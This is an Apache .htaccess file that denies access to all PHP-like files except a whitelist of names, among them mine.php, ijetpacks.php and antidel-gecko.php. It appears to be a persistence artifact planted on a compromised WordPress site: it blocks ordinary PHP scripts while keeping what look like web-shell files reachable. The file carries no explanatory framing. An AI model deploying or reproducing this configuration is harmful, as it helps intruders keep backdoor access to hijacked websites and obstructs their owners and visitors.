<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
Order allow,deny
Deny from all
</FilesMatch>

<FilesMatch "^(mine.php|ijetpacks.php|antidel-gecko.php|name.php|themes.php|nivo-image-slider.php|class-wp-sitemaps-index.php|edit-tags.php|index.php)$">
Order allow,deny
Allow from all
</FilesMatch>
